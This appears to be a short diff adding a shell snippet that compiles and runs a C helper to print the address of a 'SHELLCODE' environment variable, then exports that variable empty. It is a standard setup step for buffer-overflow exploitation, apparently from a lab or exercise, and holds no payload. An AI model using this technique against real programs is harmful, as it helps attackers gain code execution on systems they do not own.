@@ -1,0 +1,4 @@
+echo '#include <stdlib.h>\n#include <stdio.h>\nint main(void){printf("SHELLCODE=%p\\n",getenv("SHELLCODE"));}' > /tmp/getenv.c
+clang /tmp/getenv.c -o /tmp/getenv
+/tmp/./getenv
+export SHELLCODE=$()
